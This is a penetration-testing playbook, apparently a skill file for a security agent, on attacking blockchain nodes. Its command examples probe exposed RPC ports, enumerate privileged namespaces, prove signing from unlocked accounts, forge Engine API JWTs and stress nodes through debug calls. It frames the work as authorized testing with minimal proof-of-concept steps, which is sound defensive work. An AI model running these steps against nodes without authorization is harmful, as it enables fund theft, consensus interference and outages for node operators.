---
name: blockchain_node
description: Testing blockchain node/client RPC exposure, admin-method abuse, peer/consensus interfaces, and key/wallet leakage
---

# Blockchain Node / Client

A blockchain node (Geth, Erigon, Nethermind, Besu, Reth for EVM; Bitcoin Core; Solana, Cosmos/Tendermint, Substrate/Polkadot, Avalanche) is a network daemon that exposes JSON-RPC/WS APIs, a P2P/gossip layer, and often a metrics/admin plane. The attacker's objective is to reach an RPC or admin interface that was meant to be loopback-only, then pivot: drain hot-wallet funds via unlocked-account `eth_sendTransaction`, exfiltrate keys/mnemonics, abuse `admin`/`debug`/`miner`/`personal` namespaces, manipulate the peer set or consensus, or DoS the node. A single exposed `:8545` with a permissive `--http.api` is frequently a direct path to signed-transaction control.

## Attack Surface

**Scope**
- JSON-RPC over HTTP (EVM `8545`, WS `8546`; Bitcoin `8332`; Solana `8899`; Cosmos `26657`/`1317`/`9090`; Substrate `9933`/`9944`)
- WebSocket and IPC endpoints; GraphQL endpoint on Geth (`/graphql`, default `8547`)
- P2P/gossip layer (devp2p/RLPx `30303`; Bitcoin `8333`; Tendermint `26656`; libp2p)
- Engine API / consensus-execution link (`8551` + JWT `jwtsecret`)
- Metrics/pprof/admin (`6060` Geth pprof, `6061` metrics, Prometheus exporters)
- Validator/staking sidecars (Lighthouse/Prysm/Teku/Nimbus beacon + validator clients, key-manager API `5062`)

**Privileged RPC namespaces (EVM)**
- `personal` (`unlockAccount`, `sendTransaction`, `importRawKey`, `listAccounts`)
- `admin` (`addPeer`, `peers`, `nodeInfo`, `startHTTP`, `startRPC`, datadir disclosure)
- `debug`/`txpool`/`miner` (state dumps, `debug_traceTransaction`, `miner_setEtherbase`, `txpool_content`)
- `eth_sendTransaction`/`eth_sign`/`eth_signTransaction` (only sign if an account is unlocked or keystore-backed)

**Indirect sources**
- Reverse proxies (nginx/traefik) that forward `/` to RPC without method allowlisting
- Cloud node providers / load balancers fronting RPC with weak auth
- CI/CD or IaC leaking `jwtsecret`, keystore files, mnemonics, RPC API keys

## Recon & Enumeration

```bash
# Fast port sweep for common node ports
naabu -host node.target.tld -p 8545,8546,8547,8551,8899,8332,8333,26656,26657,1317,9090,9933,9944,30303,6060,6061,9100 -silent
nmap -sV -Pn -p 8545,8546,8547,8551,8899,8332,26657,30303 --version-intensity 5 node.target.tld

# Probe RPC HTTP surfaces, capture titles/tech
httpx -l targets.txt -ports 8545,8546,8547,8899,26657,1317,9933 -title -tech-detect -status-code -json -o httpx_rpc.json

# Subdomain/infra discovery for hosted RPC gateways
subfinder -d target.tld -silent | dnsx -silent | httpx -mc 200,401,403 -title

# EVM node fingerprint + namespace probe (clientVersion is the tell)
curl -s -X POST node.target.tld:8545 -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"web3_clientVersion","params":[]}'
# -> "Geth/v1.13.x", "erigon/...", "Nethermind/...", "besu/..."

# Tendermint/Cosmos status + open RPC
curl -s node.target.tld:26657/status | jq '.result.node_info'
curl -s node.target.tld:26657/net_info | jq '.result.n_peers'

# Bitcoin Core (RPC requires basic auth; test default/weak creds carefully)
curl -s --user user:pass --data-binary \
  '{"jsonrpc":"1.0","id":1,"method":"getblockchaininfo","params":[]}' \
  -H 'content-type: text/plain;' http://node.target.tld:8332/

# Nuclei has exposed-RPC and node-misconfig templates
nuclei -u http://node.target.tld:8545 -tags exposure,misconfig,blockchain,ethereum -s critical,high,medium -j -o nuclei_node.jsonl
nuclei -l targets.txt -t http/misconfiguration/ -t http/exposures/ -tags rpc,jsonrpc -rl 30 -c 10 -bs 10 -j -o nuclei_rpc.jsonl

# Secret hunting in node infra repos / configs (jwtsecret, keystores, mnemonics)
trufflehog filesystem ./node-infra --only-verified
gitleaks detect --source ./node-infra -v
# grep node configs for exposed bind addresses + open APIs
grep -rEn 'http\.addr|http\.api|ws\.api|--rpc|allow-unprotected-txs|0\.0\.0\.0' ./node-infra

# Container image audit for baked-in keys / vulnerable client versions
trivy image my/geth-node:latest --scanners vuln,secret
syft my/geth-node:latest -o table   # then grype for the SBOM CVEs

# Smart-contract tooling (when assessing contracts the node serves)
pip install slither-analyzer mythril   # slither ./contracts ; myth analyze contract.sol
```

Install hints for asset-specific tooling not in the base image:
- `npm i -g @ethersproject/cli` or use `cast` from Foundry (`curl -L https://foundry.paradigm.xyz | bash && foundryup`) — `cast rpc` is the cleanest RPC client.
- `pip install web3` for scripted method fuzzing.

## Methodology

1. **Map exposure.** Confirm which ports answer from outside the host. RPC/admin ports binding `0.0.0.0` (not `127.0.0.1`) is the root issue; verify with an external `naabu`/`httpx` from the test host, not from the node itself.
2. **Fingerprint the client + version.** `web3_clientVersion` / `getnetworkinfo` / `26657/status`. Map the exact version to known CVEs via `grype`/`nuclei`. Note chain ID (`eth_chainId`) — mainnet vs testnet sharply changes impact.
3. **Enumerate enabled namespaces.** Send one probe per privileged method; a non-"method not found" response means the namespace is enabled. Prioritize `personal`, `admin`, `debug`, `miner`, `txpool`.
4. **Test account/key exposure.** `eth_accounts` / `personal_listAccounts` / `eth_getBalance` per account. A funded, listed account on a node with `personal` enabled is the high-value target.
5. **Test signing reachability.** Without unlocking, attempt `eth_sendTransaction` from a listed account — if it does not error with "authentication needed"/"account is locked", an account is already unlocked (drainable). Use a zero-value self-transaction to prove control.
6. **Assess the consensus/engine link.** Check `8551` (Engine API): is it reachable without the `jwtsecret` HS256 token? Forge a JWT if the secret leaked.
7. **Assess P2P/peer control.** `admin_addPeer`/`admin_removePeer`, eclipse/peer-flooding feasibility, Tendermint `dial_peers`.
8. **Check metrics/pprof.** `6060/debug/pprof/` and Prometheus exporters leak goroutines, heap, peer info, and sometimes config/datadir paths.
9. **Document, validate with minimal-impact PoC, and stop at proof.**

## Key Weaknesses / Techniques

**Unauthenticated RPC with privileged APIs**
The classic: `geth --http --http.addr 0.0.0.0 --http.api eth,net,web3,personal,admin,debug`. Enumerate namespaces:
```bash
for m in personal_listAccounts admin_nodeInfo debug_traceBlock miner_start txpool_status; do
  curl -s -X POST node.target.tld:8545 -H 'content-type: application/json' \
    --data "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"$m\",\"params\":[]}" | jq -c "{m:\"$m\",r:.}";
done
```

**Unlocked-account fund drain**
If `personal` is enabled, the node may have an account unlocked via `--unlock` + `--password`. List, check balance, then prove signing control with a harmless self-send:
```bash
ACC=$(curl -s -X POST node.target.tld:8545 -H 'content-type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"eth_accounts","params":[]}' | jq -r '.result[0]')
curl -s -X POST node.target.tld:8545 -H 'content-type: application/json' \
  --data "{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"eth_sendTransaction\",\"params\":[{\"from\":\"$ACC\",\"to\":\"$ACC\",\"value\":\"0x0\"}]}"
```
A returned tx hash (instead of a "locked"/"auth" error) proves arbitrary signing; do NOT move funds to an external address — the zero-value self-send is sufficient PoC.

**Key import / private-key recovery**
`personal_importRawKey`, keystore files in the datadir (disclosed via `admin_datadir`/pprof), or mnemonics in leaked configs. `trufflehog`/`gitleaks` on infra repos; check `~/.ethereum/keystore`, `wallet.dat`, `validator_keys/`.

**Engine API / JWT consensus link**
The execution-consensus link on `8551` uses an HS256 JWT signed with a 32-byte `jwtsecret`. If the secret leaks (common in shared volumes/IaC), forge a token and drive `engine_*`:
```bash
jwt_tool -S hs256 -k jwtsecret.hex -p '{"iat":'"$(date +%s)"'}' ''   # craft token, then auth Bearer to :8551
```
Test default/predictable secrets and world-readable `jwtsecret` files.

**Debug-namespace state and DoS**
`debug_traceTransaction`/`debug_traceBlockByNumber` with full tracers, `debug_dumpBlock`, and `eth_getLogs` with `fromBlock:0,toBlock:latest` are heavy — a single request can OOM or stall the node (request-amplification DoS). Validate cost with a single bounded call; never run a sustained flood.

**P2P / consensus manipulation**
`admin_addPeer` to inject malicious peers; eclipse attempts via peer-table flooding; Tendermint `26657/dial_peers`. On PoS sidecars, probe the validator key-manager API (`5062`) for unauthenticated key listing/import (slashing risk).

**Allow-unprotected-txs & chain confusion**
`--rpc.allow-unprotected-txs` (pre-EIP-155) enables cross-chain replay. Verify `eth_chainId` and whether legacy txs are accepted.

**Proxy method-filter bypass**
RPC behind nginx often allowlists by method string. Test JSON batch arrays, namespace casing, whitespace, and duplicate keys to smuggle blocked methods past naive filters.

## Validation

1. Prove external reachability of an interface intended to be loopback (capture the response from the test host, record source IP).
2. Prove privileged-namespace enablement with a benign read (`admin_nodeInfo`, `txpool_status`) — capture the JSON.
3. For signing control, use a **zero-value self-transaction** and show the returned tx hash; do not transfer value externally.
4. For Engine API/JWT, show a successful authenticated `engine_*`/`eth_*` call with a forged token, not just a 401-vs-200 diff.
5. For key exposure, show the file path/permissions or a redacted key prefix — never paste full private keys/mnemonics into reports.
6. Capture client + exact version to tie any CVE-based finding to a fixed-in release.

## False Positives

- A node bound to `127.0.0.1` that only answers from on-host — confirm from an external interface before reporting.
- Public read-only RPC providers (Infura/Alchemy-style) that intentionally expose `eth_call`/`eth_getBalance` but block `personal`/`admin` — exposure of safe namespaces is by design.
- "method not found" / "the method X does not exist" means the namespace is disabled — not a finding.
- Testnet/devnet nodes with worthless funds (check `eth_chainId`; e.g. Sepolia `0xaa36a7`) — note reduced impact.
- `eth_sendTransaction` returning "authentication needed: password or unlock" — signing is NOT reachable; this is correct behavior.
- 401/403 from an auth-gated RPC proxy where credentials are unknown — exposure without auth bypass is informational.

## Chaining & Impact

- Open RPC + `personal` + unlocked account -> direct hot-wallet drain (critical, monetary loss).
- Leaked `jwtsecret` -> forged Engine API auth -> influence block production / liveness on a validator.
- pprof/`admin_datadir` -> keystore path disclosure -> offline keystore crack (`hashcat`) -> key recovery.
- Heavy `debug_*`/`eth_getLogs` -> node DoS -> if it's a validator, missed attestations/slashing or chain liveness impact.
- RPC info leak (`admin_nodeInfo` enode, peer IPs) -> targeted P2P eclipse -> double-spend/censorship feasibility.
- Validator key-manager API unauth -> key extraction/import -> slashing and stake loss.
- Secret in infra repo (`trufflehog`) -> RPC API key / cloud node-provider key -> broader account takeover.

## Pro Tips

1. `web3_clientVersion` is your fastest fingerprint and CVE pivot — always grab it first, then `grype` the version.
2. The single highest-value misconfig is `--http.addr 0.0.0.0` combined with `personal` in `--http.api`; grep configs for both.
3. WS (`8546`) frequently has a different/looser API set than HTTP (`8545`) — enumerate both independently.
4. Use JSON-RPC **batch arrays** to probe many methods in one request and to test proxy filter bypasses.
5. Geth's `/graphql` endpoint can expose state even when JSON-RPC is filtered — check it separately.
6. For PoC restraint, prefer reads and zero-value self-sends; tracing/log-range calls can crash production nodes, so cap them at one bounded request.
7. `jwtsecret` files are often world-readable on shared Docker volumes — check perms before assuming auth holds.
8. Tendermint/Cosmos `26657` is unauthenticated by design; the risk is `broadcast_tx`/`dial_peers` and info leak, not "no auth" alone.
9. Correlate `eth_chainId` to mainnet before escalating impact claims — testnet exposure is real but lower severity.
